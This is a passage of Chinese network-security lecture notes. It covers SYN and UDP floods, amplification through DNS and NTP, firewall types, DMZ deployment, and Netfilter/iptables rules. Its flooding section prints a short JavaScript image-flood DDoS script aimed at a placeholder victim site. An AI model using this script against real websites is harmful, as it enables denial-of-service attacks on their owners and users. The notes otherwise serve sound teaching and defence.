<li><p>避免攻击者成为通信双方的中间人</p>
<p>–部署交换式网络，用交换机代替集线器</p>
<p>–禁用主机上的源路由</p>
<p>–采用静态绑定IP-MAC映射表以避免ARP欺</p>
<p>–过滤ICMP重定向报文</p>
</li>
<li><p>TCP会话加密(IPsec协议)</p>
<p>–避免了攻击者在得到传输层的端口及序列号等关键信息</p>
</li>
<li><p>防火墙配置</p>
<p>–限制尽可能少量的外部许可连接的IP地址</p>
</li>
<li><p>检测</p>
<p>–ACK风暴：ACK包的数量明显增加</p>
</li>
</ul>
<h3 id="12-6-3-TCP-SYN-Flood"><a href="#12-6-3-TCP-SYN-Flood" class="headerlink" title="12.6.3 TCP SYN Flood"></a>12.6.3 TCP SYN Flood</h3><ul>
<li><p>拒绝服务攻击(DoS)</p>
<p>–破坏可用性</p>
</li>
<li><p>TCP SYN Flood</p>
<p>–SYN洪泛攻击</p>
<p>–利用TCP三次握手协议的缺陷</p>
<p>–大量的伪造源地址的SYN连接请求</p>
<p>–消耗目标主机的连接队列资源</p>
<p>–不能够为正常用户提供服务</p>
</li>
</ul>



<h4 id="12-6-3-1-利用Netwox进行TCP-SYN-Flood"><a href="#12-6-3-1-利用Netwox进行TCP-SYN-Flood" class="headerlink" title="12.6.3.1 利用Netwox进行TCP SYN Flood"></a>12.6.3.1 利用Netwox进行TCP SYN Flood</h4><p>工具76</p>
<h4 id="12-6-3-2-SYN-Flood攻击防范措施-SynCookie"><a href="#12-6-3-2-SYN-Flood攻击防范措施-SynCookie" class="headerlink" title="12.6.3.2 SYN Flood攻击防范措施-SynCookie"></a>12.6.3.2 SYN Flood攻击防范措施-SynCookie</h4><ul>
<li><p>弥补TCP连接建立过程资源分配这一缺陷</p>
</li>
<li><p>无状态的三次握手</p>
<p>–服务器收到一个SYN报文后,不立即分配缓冲区</p>
<p>–利用连接的信息生成一个cookie, 作为SEQ</p>
<p>–客户端返回ACK中带着ACK = cookie+1</p>
<p>–服务器端核对cookie, 通过则建立连接，分配资源</p>
</li>
</ul>

<ul>
<li><p>有状态防火墙</p>
<p>–网络中的TCP连接进行状态监控和处理</p>
<p>–维护TCP连接状态：NEW状态、GOOD状态、BAD状态…</p>
<p>–三次握手‖代理</p>
</li>
</ul>

<h3 id="12-6-4-UDP-Flood攻击"><a href="#12-6-4-UDP-Flood攻击" class="headerlink" title="12.6.4 UDP Flood攻击"></a>12.6.4 UDP Flood攻击</h3><ul>
<li><p>UDP协议</p>
<p>–无状态不可靠</p>
<p>–仅仅是传输数据报</p>
</li>
<li><p>UDP Flood</p>
<p>–带宽耗尽型拒绝服务攻击</p>
<p>–分布式拒绝服务攻击(DDoS)</p>
<p>–利用僵尸网络控制大量受控傀儡主机</p>
<p>–通常会结合IP源地址欺骗技术</p>
</li>
</ul>
<h4 id="12-6-4-1-UDP-Flood攻击防范措施"><a href="#12-6-4-1-UDP-Flood攻击防范措施" class="headerlink" title="12.6.4.1 UDP Flood攻击防范措施"></a>12.6.4.1 UDP Flood攻击防范措施</h4><ul>
<li><p>禁用或过滤监控和响应服务</p>
</li>
<li><p>禁用或过滤其它的UDP 服务</p>
</li>
<li><p>网络关键位置使用防火墙和代理机制来过滤掉一些非预期的网络流量</p>
</li>
<li><p>遭遇带宽耗尽型拒绝服务攻击</p>
<p>–终端无能为力</p>
<p>–补救措施：网络扩容、转移服务器位置</p>
<p>–事件响应：汇报给安全应急响应部门、追溯和处置</p>
<p>–流量清洗解决方案：ISP为关键客户/服务所提供</p>
</li>
</ul>
<h4 id="12-6-4-2-另类DoS攻击"><a href="#12-6-4-2-另类DoS攻击" class="headerlink" title="12.6.4.2 另类DoS攻击"></a>12.6.4.2 另类DoS攻击</h4><h5 id="12-6-4-2-1-流量放大攻击"><a href="#12-6-4-2-1-流量放大攻击" class="headerlink" title="12.6.4.2.1 流量放大攻击"></a>12.6.4.2.1 流量放大攻击</h5><ul>
<li>对单个较小的UDP请求包回复以一个较大的UDP响应包的服务，可被用来放大 DOS 攻击</li>
<li>攻击者伪造网络包，将其源地址设为受害者的 IP 地址，当服务产生响应时，大量的数据会发向受害者的地址。</li>
<li>攻击者需要提供这类服务的大量地址以展开攻击，否则的话，受害者只需简单地丢弃来自这些少量地址的分组就能避免攻击。</li>
</ul>

<p>常用的UDP放大器</p>
<ul>
<li><p>DNS：ANY 查询将返回服务器所拥有的域的所有记录</p>
</li>
<li><p>NTP：MONLIST 返回最近询问时间的 600 个客户端</p>
</li>
</ul>
<p>时至今日，虽然两者都考虑过配置错误的问题, 但在Internet上，保存有十万计的错误配置主机。</p>
<h5 id="12-6-4-2-2-Javascript-based-DDoS-攻击"><a href="#12-6-4-2-2-Javascript-based-DDoS-攻击" class="headerlink" title="12.6.4.2.2 Javascript-based DDoS 攻击"></a>12.6.4.2.2 Javascript-based DDoS 攻击</h5><ul>
<li>简单的一段攻击代码attack.js</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">imgflood</span><span class="params">()</span> &#123;</span><br><span class="line">  var TARGET = <span class="string">&#x27;victim-website.com&#x27;</span></span><br><span class="line">  var URI = <span class="string">&#x27;/index.php?&#x27;</span></span><br><span class="line">  var pic = new Image()</span><br><span class="line">  var rand = Math.<span class="built_in">floor</span>(Math.random() * <span class="number">1000</span>)</span><br><span class="line">  pic.src = <span class="string">&#x27;http://&#x27;</span>+TARGET+URI+rand+<span class="string">&#x27;=val&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">setInterval(imgflood, <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<p>场景1</p>

<p>场景2</p>

<p>场景3</p>

<p>解决方案</p>

<h2 id="12-7-TCP-IP网络协议栈攻击防范措施"><a href="#12-7-TCP-IP网络协议栈攻击防范措施" class="headerlink" title="12.7 TCP/IP网络协议栈攻击防范措施"></a>12.7 TCP/IP网络协议栈攻击防范措施</h2><h3 id="12-7-1-监测、预防与安全加固"><a href="#12-7-1-监测、预防与安全加固" class="headerlink" title="12.7.1 监测、预防与安全加固"></a>12.7.1 监测、预防与安全加固</h3><ul>
<li><p>网络接口层–主要安全威胁是网络嗅探</p>
<p>–局域网中的监听点检测</p>
<p>–网络设计上尽量细分和优化网络结构</p>
<p>–关键路径上的网关、路由器等设备的严格安全防护</p>
<p>–各类网络采用上层的加密通信协议</p>
</li>
<li><p>互联层</p>
<p>–多种检测和过滤技术来发现和阻断网络中欺骗攻击</p>
<p>–增强防火墙、路由器和网关设备的安全策略(egress filtering)</p>
<p>–关键服务器使用静态绑定IP-MAC映射表、使用IPsec协议加密通讯等预防机制</p>
</li>
<li><p>传输层：加密传输和安全控制机制(身份认证，访问控制)</p>
</li>
<li><p>应用层：加密，用户级身份认证，数字签名技术，授权和访问控制技术以及主机安全技术如审计、入侵检测</p>
</li>
</ul>
<h3 id="12-7-2-网络安全协议"><a href="#12-7-2-网络安全协议" class="headerlink" title="12.7.2 网络安全协议"></a>12.7.2 网络安全协议</h3><ul>
<li><p>网络接口层</p>
<p>–无线：WPA/WPA2</p>
<p>–统一认证：802.1X</p>
</li>
<li><p>网络互联层</p>
<p>–IPsec协议簇</p>
<p>–AH协议：完整性、认证、抗重放攻击</p>
<p>–ESP协议：机密性、数据源验证、抗重放、完整性</p>
</li>
<li><p>传输层</p>
<p>–TLS/SSL: 加密、可靠</p>
</li>
<li><p>应用层</p>
<p>–HTTPS、S/MIME、SET</p>
</li>
</ul>

<h1 id="13-网络安全防护技术"><a href="#13-网络安全防护技术" class="headerlink" title="13. 网络安全防护技术"></a>13. 网络安全防护技术</h1><h2 id="13-1-安全模型-P2DR模型"><a href="#13-1-安全模型-P2DR模型" class="headerlink" title="13.1 安全模型-P2DR模型"></a>13.1 安全模型-P2DR模型</h2><h3 id="13-1-1-信息安全技术与安全模型的发展"><a href="#13-1-1-信息安全技术与安全模型的发展" class="headerlink" title="13.1.1 信息安全技术与安全模型的发展"></a>13.1.1 信息安全技术与安全模型的发展</h3><ul>
<li><p>COMSEC –通信安全</p>
<p>–保护军事等机密信息，机密(Confidentiality)</p>
<p>–专门针对机密性的BLP(Bell-La Padula)多级安全策略模型</p>
</li>
<li><p>COMPSEC -计算机安全</p>
<p>–完整性(Integrity)也被纳入了核心安全属性</p>
<p>–引入身份认证、访问控制技术</p>
<p>–针对完整性保护的Biba模型和Clark-Wilson模型</p>
</li>
<li><p>NETSEC -网络安全</p>
<p>–网络信息服务的可用性(Availability)也上升成为核心的安全属性</p>
</li>
<li><p>IA –信息保障(NSA)</p>
<p>–机密性、完整性、可用性、真实性、不可抵赖性</p>
<p>–信息保障体系；纵深安全防护体系</p>
</li>
</ul>
<h3 id="13-1-2-安全评估模型与标准"><a href="#13-1-2-安全评估模型与标准" class="headerlink" title="13.1.2 安全评估模型与标准"></a>13.1.2 安全评估模型与标准</h3><ul>
<li><p>安全评估</p>
<p>–评估信息系统是否能够满足特定的安全需求和属性</p>
</li>
<li><p>安全评估模型</p>
<p>–1985：美国可信计算机安全评估准则TCSEC《桔皮书》</p>
</li>
<li><p>分级评估：A\B\C\D</p>
<p>–199x：欧洲ITSEC安全测评标准</p>
<p>–1999：Common Criteria(CC)标准</p>
<p>–1999：GB17859《计算机信息系统安全保护等级划分标准》</p>
</li>
<li><p>静态安全模型VS. 动态安全模型(可适应安全模型)</p>
</li>
</ul>
<h3 id="13-1-3-PDR安全模型"><a href="#13-1-3-PDR安全模型" class="headerlink" title="13.1.3 PDR安全模型"></a>13.1.3 PDR安全模型</h3><ul>
<li><p>PDR: 基于时间的安全(Time-based Security)</p>
<p>–可以量化，可以计算</p>
<p>–防御延缓攻击时间，及时的检测和响应</p>
</li>
</ul>
<p>PDR的最基本的意思是，认为安全有三个不可或缺的功能要素：防护、检测、响应。</p>

<p>Pt：整个防护体系的整体防护时间</p>
<p>Dt：检测时间</p>
<p>Rt：响应时间</p>
<p>要达到安全，就要$Pt&gt;Dt+Rt$</p>
<h3 id="13-1-4-P2DR安全模型"><a href="#13-1-4-P2DR安全模型" class="headerlink" title="13.1.4 P2DR安全模型"></a>13.1.4 P2DR安全模型</h3><p>美国ISS公司提出的动态网络安全体系的代表模型，也是动态安全模型的雏形。</p>

<p>网络安全是相对的，没有绝对的安全。</p>
<p>根据风险分析制定安全策略(Policy)，PDR构成动态闭环。</p>
<ul>
<li><p>P: 执行安全防护策略</p>
<p>防火墙、身份认证、访问控制、加密</p>
</li>
<li><p>D: 实时检测</p>
<p>漏洞评估、入侵检测</p>
</li>
<li><p>R: 实时响应</p>
<p>应急响应、备份恢复、灾难恢复</p>
</li>
</ul>
<h2 id="13-2-P：防御技术"><a href="#13-2-P：防御技术" class="headerlink" title="13.2 P：防御技术"></a>13.2 P：防御技术</h2><ul>
<li><p>网络防御-边界网络安全设备</p>
<p>–网络访问控制：防火墙，VPN</p>
<p>–网络内容控制：SCM</p>
<p>–IPS（入侵防御系统）, IMS(入侵管理系统), UTM（统一威胁管理）</p>
</li>
<li><p>主机防御</p>
<p>–漏洞扫描和补丁管理</p>
<p>–个人防火墙</p>
<p>–防病毒软件</p>
<p>–系统诊断与恢复软件</p>
</li>
<li><p>安全产业“老三样”: 防火墙、入侵检测、防病毒</p>
</li>
<li><p>安全产业“新三样”: 安全管理平台、安全服务、个人安全防御</p>
</li>
</ul>
<h3 id="13-2-1-防火墙-FireWall"><a href="#13-2-1-防火墙-FireWall" class="headerlink" title="13.2.1 防火墙(FireWall)"></a>13.2.1 防火墙(FireWall)</h3><ul>
<li>防火墙是一项协助确保信息安全的设备，会依照特定的规则，允许或是限制传输的数据通过。</li>
<li>置于不同的网络安全域之间，对网络流量或访问行为实施访问控制的安全组件或设备。</li>
<li>大楼的“门卫”</li>
</ul>

<h4 id="13-2-1-1-防火墙技术关键特性"><a href="#13-2-1-1-防火墙技术关键特性" class="headerlink" title="13.2.1.1 防火墙技术关键特性"></a>13.2.1.1 防火墙技术关键特性</h4><ul>
<li><p>只能对流经的网络数据进行检查控制：边界部署</p>
</li>
<li><p>不具备主动检测网络攻击数据能力，需合理设计安全控制策略</p>
</li>
<li><p>并非“一劳永逸”的“安全最终解决方案”</p>
</li>
</ul>
<h4 id="13-2-1-2-功能"><a href="#13-2-1-2-功能" class="headerlink" title="13.2.1.2 功能"></a>13.2.1.2 功能</h4><ul>
<li><p>在网络协议栈的各个层次上实施网络访问控制机制</p>
<p>–网络层：包过滤</p>
<p>–传输层：电路级代理</p>
<p>–应用层：应用层代理/网关</p>
</li>
<li><p>基本功能：控制在计算机网络中不同信任程度网络域间传送的数据流</p>
<p>–检查控制进出网络的网络流量</p>
<p>–防止脆弱或不安全的协议和服务</p>
<p>–防止内部网络信息的外泄</p>
<p>–对网络存取和访问进行监控审计</p>
<p>–防火墙可以强化网络安全策略并集成其他安全防御机制</p>
</li>
</ul>
<h4 id="13-2-1-3-不足"><a href="#13-2-1-3-不足" class="headerlink" title="13.2.1.3 不足"></a>13.2.1.3 不足</h4><ul>
<li><p>作为网络边界防护机制而先天无法防范的安全威胁</p>
<p>–来自网络内部的安全威胁</p>
<p>–通过非法外联的网络攻击</p>
<p>–计算机病毒传播</p>
</li>
<li><p>由于技术瓶颈问题目前还无法有效防范的安全威胁</p>
<p>–针对开放服务安全漏洞的渗透攻击</p>
<p>–针对网络客户端程序的渗透攻击</p>
<p>–基于隐蔽通道进行通信的特洛伊木马或僵尸网络</p>
</li>
</ul>
<h4 id="13-2-1-4-防火墙技术类型"><a href="#13-2-1-4-防火墙技术类型" class="headerlink" title="13.2.1.4 防火墙技术类型"></a>13.2.1.4 防火墙技术类型</h4><ul>
<li><p>包过滤防火墙(packet filter)</p>
<p>–1988, DEC</p>
<p>–网络包粒度, 工作在网络层, 主要实现形式为路由器ACL</p>
</li>
<li><p>状态防火墙(stateful firewall)</p>
<p>–1980s底, AT&amp;T Bell</p>
<p>–网络会话粒度,工作在传输层</p>
<p>–目前防火墙最主要实现方式</p>
</li>
<li><p>电路级代理技术</p>
</li>
<li><p>应用层代理防火墙(application layer firewall)</p>
<p>–Paper: 1990 Purdue, AT&amp;T</p>
<p>–Product: 1991 DEC</p>
<p>–应用层代理，工作在应用层</p>
</li>
</ul>

<h5 id="13-2-1-4-1-包过滤防火墙"><a href="#13-2-1-4-1-包过滤防火墙" class="headerlink" title="13.2.1.4.1 包过滤防火墙"></a>13.2.1.4.1 包过滤防火墙</h5><ul>
<li><p>基本的思想很简单</p>
<p>–对于每个进来的包，适用一组规则，然后决定转发或者丢弃该包</p>
<p>–往往配置成双向的</p>
</li>
<li><p>如何过滤</p>
<p>–过滤的规则以IP和传输层的头中的域(字段)为基础，包括源和目标IP地址、IP协议域、源和目标端口号</p>
<p>–过滤器往往建立一组规则，根据IP包是否匹配规则中指定的条件来作出决定。</p>
<p>–如果匹配到一条规则，则根据此规则决定转发或者丢弃</p>
<p>–如果所有规则都不匹配，则根据缺省策略</p>
</li>
<li><p>根据定义好的过滤规则审查每个数据包，过滤规则基于数据包的报头信息进行制订。</p>
</li>
<li><p>报头信息中包括IP源地址、IP目标地址、传输协议(TCP、UDP、ICMP等等)、TCP/UDP目标端口、ICMP消息类型等</p>
</li>
</ul>

<ul>
<li><p>通常在路由器上实现</p>
<p>–实际上是一种网络层的访问控制机制</p>
<p>–路由器ACL机制</p>
</li>
<li><p>在网络层上进行监测</p>
<p>–仅仅根据数据包自身包含的信息(协议头部)进行检查和过滤</p>
<p>–并没有考虑连接状态信息</p>
</li>
<li><p>优点：</p>
<p>–实现简单</p>
<p>–对用户透明</p>
<p>–效率高</p>
</li>
<li><p>缺点：</p>
<p>–正确制定规则并不容易</p>
<p>–不可能引入认证机制</p>
</li>
</ul>
<h5 id="13-2-1-4-2-状态防火墙"><a href="#13-2-1-4-2-状态防火墙" class="headerlink" title="13.2.1.4.2 状态防火墙"></a>13.2.1.4.2 状态防火墙</h5><ul>
<li><p>状态防火墙</p>
<p>–跟踪网络会话(连接)状态, 判断报文合法性</p>
<p>–在网络会话粒度上匹配和实施防火墙规则</p>
<p>–特性: 状态报文检查(SPI: stateful packet inspection)</p>
</li>
</ul>

<ul>
<li><p>状态防火墙机制</p>
<p>–跟踪和维护网络连接状态信息(CT: connection table)</p>
<p>–TCP网络连接</p>
<ul>
<li>SYN包: NEW connections</li>
<li>经过三次握手: ESTABLISHED connections</li>
</ul>
<p>–UDP会话</p>
<ul>
<li>一般处理UDP包时, 马上设置为ESTABLISHED</li>
</ul>
<p>–在网络访问配置规则中支持对状态的匹配</p>
</li>
<li><p>目前防火墙产品的主流应用技术</p>
<p>–国外厂商: Check Point/Cisco/ FORTINET/Juniper…</p>
<p>–国内厂商: 天融信/联想/方正/…</p>
<p>–开源软件: Netfilter*/IPTables* (Linux)</p>
</li>
</ul>
<h4 id="13-2-1-5-防火墙产品"><a href="#13-2-1-5-防火墙产品" class="headerlink" title="13.2.1.5 防火墙产品"></a>13.2.1.5 防火墙产品</h4><ul>
<li><p>防火墙产品类别</p>
<p>–集成包过滤功能的路由器</p>
<p>–基于通用操作系统的防火墙软件产品</p>
<p>–软件防火墙</p>
<p>–基于安全操作系统的防火墙</p>
<p>–软件防火墙+硬件Box</p>
<p>–硬件防火墙设备</p>
<p>–硬件防火墙</p>
</li>
<li><p>个人防火墙</p>
<p>–Windows个人防火墙</p>
<p>–天网防火墙</p>
<p>–360安全卫士/瑞星</p>
</li>
</ul>
<h4 id="13-2-1-6-防火墙部署方法"><a href="#13-2-1-6-防火墙部署方法" class="headerlink" title="13.2.1.6 防火墙部署方法"></a>13.2.1.6 防火墙部署方法</h4><ul>
<li><p>包过滤路由器</p>
</li>
<li><p>双宿主堡垒主机</p>
</li>
<li><p>屏蔽主机</p>
</li>
<li><p>屏蔽子网</p>
</li>
<li><p>几个基本概念</p>
<p>–堡垒主机(Bastion Host)：对外部网络暴露，同时也是内部网络用户的主要连接点</p>
<p>–双宿主主机(dual-homed host)：至少有两个网络接口的通用计算机系统</p>
<p>–DMZ(Demilitarized Zone，非军事区或者停火区)：在内部网络和外部网络之间增加的一个子网</p>
</li>
</ul>
<h5 id="13-2-1-6-1-包过滤路由器部署方案"><a href="#13-2-1-6-1-包过滤路由器部署方案" class="headerlink" title="13.2.1.6.1 包过滤路由器部署方案"></a>13.2.1.6.1 包过滤路由器部署方案</h5><ul>
<li><p>包过滤防火墙功能的路由器</p>
<p>–内部网络和外部网络之间的唯一连接点</p>
<p>–路由+ACL</p>
</li>
<li><p>优势</p>
<p>–成本低、易于使用</p>
</li>
<li><p>缺点</p>
<p>–一旦路由器被攻破，内网完全暴露</p>
<p>–内部网络信息对外公开，可攻击开放的主机和服务</p>
</li>
</ul>

<h5 id="13-2-1-6-2-双宿主堡垒主机部署方案"><a href="#13-2-1-6-2-双宿主堡垒主机部署方案" class="headerlink" title="13.2.1.6.2 双宿主堡垒主机部署方案"></a>13.2.1.6.2 双宿主堡垒主机部署方案</h5><ul>
<li><p>使用应用代理网关作为双宿主堡垒主机</p>
<p>–一个使用公网IP地址连接外部网络</p>
<p>–一个使用私有IP地址连接内部网络</p>
<p>–由应用代理服务器程序为特定的网络应用提供代理</p>
</li>
<li><p>优点：对外屏蔽内网信息、用户级身份认证和行为审计</p>
</li>
<li><p>缺点：内网对外访问控制过于严格、堡垒主机安全差、，一旦堡垒主机被攻破，内网也将全面地暴露</p>
</li>
</ul>

<h5 id="13-2-1-6-3-屏蔽主机"><a href="#13-2-1-6-3-屏蔽主机" class="headerlink" title="13.2.1.6.3 屏蔽主机"></a>13.2.1.6.3 屏蔽主机</h5><ul>
<li><p>结合包过滤防火墙和应用层代理</p>
<p>–两层安全防护</p>
<p>–包过滤防火墙：网络层的访问控制</p>
<p>–应用层代理堡垒主机：进行应用安全控制</p>
</li>
<li><p>优势：双重安全可靠设计</p>
</li>
<li><p>缺点：对外开放服务器成弱点</p>
</li>
</ul>

<h5 id="13-2-1-6-4-屏蔽子网"><a href="#13-2-1-6-4-屏蔽子网" class="headerlink" title="13.2.1.6.4 屏蔽子网"></a>13.2.1.6.4 屏蔽子网</h5><ul>
<li><p>屏蔽子网：DMZ区</p>
<p>–应用代理及对外服务器</p>
<p>–三层安全防护：外网防火墙、应用层代理、内网防火墙</p>
</li>
</ul>

<h4 id="13-2-1-7-Linux中的开源防火墙"><a href="#13-2-1-7-Linux中的开源防火墙" class="headerlink" title="13.2.1.7 Linux中的开源防火墙"></a>13.2.1.7 Linux中的开源防火墙</h4><ul>
<li><p>Netfilter</p>
<p>–Linux内核中的防火墙模块</p>
<p>–Netfilter特性</p>
<ul>
<li>包过滤-&gt;状态报文检查</li>
<li>灵活可扩展框架, 支持NAT网络地址转换, 提供多层API接口以支持第三方扩展</li>
</ul>
<p>–Netfilter功能</p>
<ul>
<li>构建防火墙, NAT共享上网, 利用NAT构建透明代理, 构建QoS或策略路由器, …</li>
</ul>
</li>
<li><p>IPTables</p>
<p>–Linux应用层的防火墙配置工具</p>
<p>–ipfwadm(2.0.x) -&gt; ipchains(2.2.x) -&gt; iptables(2.4.x/2.6.x)</p>
</li>
</ul>
<h5 id="13-2-1-7-1-Netfilter-iptables的缺省规则表-链"><a href="#13-2-1-7-1-Netfilter-iptables的缺省规则表-链" class="headerlink" title="13.2.1.7.1 Netfilter/iptables的缺省规则表/链"></a>13.2.1.7.1 Netfilter/iptables的缺省规则表/链</h5>
<h5 id="13-2-1-7-2-Netfilter在Linux协议栈中的hook检查点"><a href="#13-2-1-7-2-Netfilter在Linux协议栈中的hook检查点" class="headerlink" title="13.2.1.7.2 Netfilter在Linux协议栈中的hook检查点"></a>13.2.1.7.2 Netfilter在Linux协议栈中的hook检查点</h5><ul>
<li>PREROUTING: 进入防火墙数据包, 路由转发前, 实现NAPT/DNAT</li>
<li>LOCAL INPUT: 发往本地协议栈的数据包, 实现本地安全防护</li>
<li>FORWARD: 经过防火墙转发的数据包, 实现网络流状态过滤</li>
<li>LOCAL OUTPUT: 从本地协议栈发出的数据包, 限制对外访问</li>
<li>POSTROUTING: 从防火墙发出数据包, 路由转发后, 实现SNAT</li>
</ul>

<h5 id="13-2-1-7-3-Netfilter的检查链和处理策略"><a href="#13-2-1-7-3-Netfilter的检查链和处理策略" class="headerlink" title="13.2.1.7.3 Netfilter的检查链和处理策略"></a>13.2.1.7.3 Netfilter的检查链和处理策略</h5><ul>
<li><p>Netfilter检查链</p>
<p>–通过防火墙转发流量: PREROUTINGàFORWARDàPOSTROUTING</p>
<p>–传入防火墙本机流量: PREROUTINGàINPUT</p>
<p>–防火墙本机传出流量: OUTPUTàPOSTROUTING</p>
</li>
<li><p>Netfilter处理策略</p>
<p>–ACCEPT: 允许数据包经过网络协议栈</p>
<p>–DROP: 静默地丢弃数据包</p>
<p>–QUEUE: 通过nf_queue机制将数据包传送至应用层供上层应用处理</p>
<p>–STOLEN: 保持数据包直到特定条件后处理, 用于处理IP分片等</p>
<p>–REPEAT: 使得数据包重新进入hook点</p>
</li>
</ul>
<h5 id="13-2-1-7-4-Netfilter的报文状态检查"><a href="#13-2-1-7-4-Netfilter的报文状态检查" class="headerlink" title="13.2.1.7.4 Netfilter的报文状态检查"></a>13.2.1.7.4 Netfilter的报文状态检查</h5><ul>
<li><p>支持的网络连接状态</p>
<p>–NEW: 新建连接, 连接初始报文或只看到一个方向的数据包</p>
<p>–ESTABLISHED: 已建连接, 双向通讯</p>
<p>–RELATED: 相关连接, 用于处理FTP等协商端口的网络协议</p>
<p>–INVALD: 非法状态</p>
</li>
<li><p>实现机制</p>
<p>–使用hash表等实现CT表, 支持对已记录连接的快速查找</p>
<p>–在PREROUTING, INPUT, POSTROUTING等hook点上注册callback函数, 用于跟踪网络连接状态</p>
<p>–支持用户态程序(IPTables)灵活配置各个hook点上的防火墙规则, 对网络连接进行访问控制</p>
</li>
</ul>
<h5 id="13-2-1-7-5-Netfilter防火墙规则过滤"><a href="#13-2-1-7-5-Netfilter防火墙规则过滤" class="headerlink" title="13.2.1.7.5 Netfilter防火墙规则过滤"></a>13.2.1.7.5 Netfilter防火墙规则过滤</h5>
<h5 id="13-2-1-7-6-Iptables"><a href="#13-2-1-7-6-Iptables" class="headerlink" title="13.2.1.7.6 Iptables"></a>13.2.1.7.6 Iptables</h5><ul>
<li><p>为用户提供了配置netfilter规则的命令行接口</p>
<p>–$ iptables[-t table] command [match] [target]</p>
</li>
<li><p>command-规则配置动作</p>
<p>–-A(添加)、-D(删除)、-P(缺省策略)、-N(新建链)、-F(清空)、-L(列举)</p>
</li>
<li><p>match-规则匹配条件</p>
<p>–通用匹配和特定协议匹配</p>
<p>–支持“与”关系</p>
</li>
<li><p>Target-目标操作</p>
<p>–ACCEPT、DROP、REJECT、RETURN</p>
</li>
</ul>
<h5 id="13-2-1-7-7-Netfilter-iptables的过滤与报文状态检查机制"><a href="#13-2-1-7-7-Netfilter-iptables的过滤与报文状态检查机制" class="headerlink" title="13.2.1.7.7 Netfilter/iptables的过滤与报文状态检查机制"></a>13.2.1.7.7 Netfilter/iptables的过滤与报文状态检查机制</h5><ul>
<li><p>两种策略</p>
<p>(1) 设置缺省的通行策略为允许(ACCEPT)，然后定义禁止的网络流量和行为；-Bad</p>
<p>(2) 设置缺省的通行策略为禁止(DROP)，然后定义允许的网络流量和行为；-Good</p>
</li>
<li><p>静态包过滤</p>
<p>–# iptables-t filter -A FORWARD -s 192.168.0.0/24 -d 192.168.1.0/24 -j ACCEPT</p>
</li>
<li><p>报文状态检查</p>
<p>–状态：NEW、ESTABLISHED、RELATED、INVALD</p>
<p>–# iptables-t filter -A FORWARD -d [WEB_SERVER] -m state —state NEW -j ACCEPT</p>
<p>–# iptables-t filter -A FORWARD -m state —state RELATED,ESTABLISHED -j ACCEPT</p>
</li>
</ul>
<h5 id="13-2-1-7-8-Netfilter-iptables的NAT机制"><a href="#13-2-1-7-8-Netfilter-iptables的NAT机制" class="headerlink" title="13.2.1.7.8 Netfilter/iptables的NAT机制"></a>13.2.1.7.8 Netfilter/iptables的NAT机制</h5><ul>
<li><p>NAT机制类型</p>
<p>–SNAT：源地址/端口NAT</p>
<p>–DNAT：目的地址/端口NAT</p>
</li>
<li><p>NAT功能类型</p>
<p>–IP伪装（masquerading）：属于SNAT</p>
<ul>
<li><h1 id="iptables-t-nat-A-POSTROUTING-ieth1-o-eth0-j-MASQUERADE"><a href="#iptables-t-nat-A-POSTROUTING-ieth1-o-eth0-j-MASQUERADE" class="headerlink" title="iptables-t nat-A POSTROUTING -ieth1 -o eth0 -j MASQUERADE"></a>iptables-t nat-A POSTROUTING -ieth1 -o eth0 -j MASQUERADE</h1></li>
</ul>
<p>–透明代理（transparent proxying）：属于DNAT</p>
<ul>
<li><h1 id="iptables-t-nat-A-PREROUTING-ieth1-j-DNAT-—to-5-6-7-8"><a href="#iptables-t-nat-A-PREROUTING-ieth1-j-DNAT-—to-5-6-7-8" class="headerlink" title="iptables-t nat-A PREROUTING -ieth1 -j DNAT —to 5.6.7.8"></a>iptables-t nat-A PREROUTING -ieth1 -j DNAT —to 5.6.7.8</h1></li>
</ul>
<p>–端口转发（port forwarding）</p>
<ul>
<li><h1 id="iptables-A-PREROUTING-t-nat-p-tcp-d-1-2-3-4-—dport8080-j-DNAT-—to-192-168-1-1-80"><a href="#iptables-A-PREROUTING-t-nat-p-tcp-d-1-2-3-4-—dport8080-j-DNAT-—to-192-168-1-1-80" class="headerlink" title="iptables-A PREROUTING -t nat-p tcp-d 1.2.3.4 —dport8080 -j DNAT —to 192.168.1.1:80"></a>iptables-A PREROUTING -t nat-p tcp-d 1.2.3.4 —dport8080 -j DNAT —to 192.168.1.1:80</h1></li>
</ul>
</li>
</ul>
<h3 id="13-2-2-代理技术"><a href="#13-2-2-代理技术" class="headerlink" title="13.2.2 代理技术"></a>13.2.2 代理技术</h3><ul>
<li><p>代理(proxy)实际上也是一种安全防护技术</p>
<p>–允许客户端通过代理与网络服务进行非直接的连接</p>
<p>–在代理服务器上可以进行访问控制和内容检查</p>
</li>
<li><p>不同类型的代理技术</p>
<p>–应用层：应用层代理(HTTP代理)</p>
<p>–传输层：电路级代理(Socks代理)</p>
<p>–网络层：NAT代理(NAT网关、拨号上网路由器)</p>
</li>
</ul>
<h4 id="13-2-2-1-应用层代理"><a href="#13-2-2-1-应用层代理" class="headerlink" title="13.2.2.1 应用层代理"></a>13.2.2.1 应用层代理</h4><ul>
<li><p>应用层代理</p>
<p>–也称为应用层网关、代理服务器</p>
<p>–特定应用层网络服务(HTTP/Email…)</p>
<p>–MSP –Microsoft Proxy Server、Squid</p>
</li>
</ul>

<ul>
<li><p>应用层代理优势</p>
<p>–隐藏内部网络信息</p>
<p>–通讯中转，严格内容审查</p>
<p>–存储转发机制，在线审计</p>
<p>–用户级身份认证机制</p>
</li>
<li><p>应用层代理不足</p>
<p>–不通用、不透明、处理速度较慢、部署代价较高</p>
</li>
</ul>
<h4 id="13-2-2-2-电路级代理"><a href="#13-2-2-2-电路级代理" class="headerlink" title="13.2.2.2 电路级代理"></a>13.2.2.2 电路级代理</h4><ul>
<li><p>电路级代理</p>
<p>–Socks代理</p>
<p>–工作在传输层</p>
<p>–同时为多种不同的应用服务提供支持</p>
</li>
<li><p>工作机制</p>
<p>–TCP层中继</p>
<p>–建立外部连接，并在连接会话间转发数据</p>
</li>
<li><p>差异：通用、用户级身份认证，但无法进行细致内容审查</p>
</li>
</ul>

<h4 id="13-2-2-3-NAT代理-网络地址转换"><a href="#13-2-2-3-NAT代理-网络地址转换" class="headerlink" title="13.2.2.3 NAT代理-网络地址转换"></a>13.2.2.3 NAT代理-网络地址转换</h4>
